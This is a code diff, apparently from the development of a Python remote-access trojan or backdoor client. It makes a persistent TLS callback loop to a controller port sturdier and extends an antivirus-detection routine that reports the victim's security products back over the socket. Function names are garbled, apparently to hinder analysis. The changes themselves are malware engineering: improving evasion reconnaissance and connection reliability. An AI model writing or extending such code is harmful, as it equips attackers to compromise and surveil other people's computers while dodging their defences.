@@ -323,16 +323,16 @@ def make_conect ():
     global connect ,sock
     while True:
         sock = socket . socket (socket . AF_INET ,socket . SOCK_STREAM)
-        #try:
-        sock.connect ( ( '127.0.0.1' ,2457) )
-        sock = context . wrap_socket (sock)
-        game (sock)
-        time . sleep (5)
-        """except Exception as e:
+        try:
+            sock.connect ( ( '127.0.0.1' ,2457) )
+            sock = context . wrap_socket (sock)
+            game (sock)
+            time . sleep (5)
+        except Exception as e:
             print(e)
             time.sleep (10)
             make_conect ()
-        """
+
 
 def srtTks():
     try:
@@ -461,6 +461,8 @@ def A_V_Dte_Ct():
         "SecurityHealthSystray",
         "Norton",
         "McAfee",
+        "Panda",
+        "PSUAMain",
         "Avast",
         "AVG",
         "Kaspersky",
@@ -495,6 +497,8 @@ def A_V_Dte_Ct():
                 av = "Windows Defender"
             elif "SecurityHealthSystray".lower() in av:
                 av = "Windows Defender"
+            elif "PSUAMain".lower() in av:
+                av = "Panda AV"
             sock.send(av .encode ())
         sock.send("end" . encode ())
     else:
